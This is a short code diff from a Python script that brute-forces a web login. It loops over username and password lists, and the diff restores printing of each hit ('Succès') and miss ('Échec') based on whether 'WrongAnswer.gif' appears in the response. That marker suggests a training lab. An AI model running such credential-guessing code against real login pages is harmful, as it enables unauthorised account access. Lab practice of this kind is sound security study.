@@ -33,9 +33,8 @@ for username in username_list:
         }
         response = requests.get(url, params=params, headers=headers, cookies=cookies)
         
-        ##if "WrongAnswer.gif" not in response.text:
-            ##print(f'Succès : Combiné trouvé - {username}/{password}')
-            ##exit(1)
-        ##else:
-            ##print(f'Échec : {username}/{password}')
-        print(f'{password}')
+        if "WrongAnswer.gif" not in response.text:
+            print(f'Succès : Combiné trouvé - {username}/{password}')
+            exit(1)
+        else:
+            print(f'Échec : {username}/{password}')
